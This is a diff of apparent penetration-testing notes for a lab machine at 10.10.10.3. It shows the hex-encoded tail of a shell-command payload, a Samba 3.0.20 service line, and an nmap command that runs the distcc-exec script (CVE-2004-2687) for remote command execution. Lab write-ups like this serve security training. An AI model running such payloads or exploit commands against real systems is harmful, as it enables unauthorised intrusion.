@@ -51,12 +51,16 @@ buf += b"\x6d\x70\x2f\x6f\x77\x78\x70\x63\x20\x32\x3e\x26\x31"
 buf += b"\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6f\x77\x78"
 buf += b"\x70\x63"
 
-
+{"mode":"full","isActive":false}
 
 
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 
 
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+	/usr/share/nmap/scripts/distcc-cve2004-2687.nse
+	distcc-exec
+	sudo nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="cmd='hostname'"
+		syntax is incorrect, amended as above
 
 
-{"mode":"full","isActive":false}
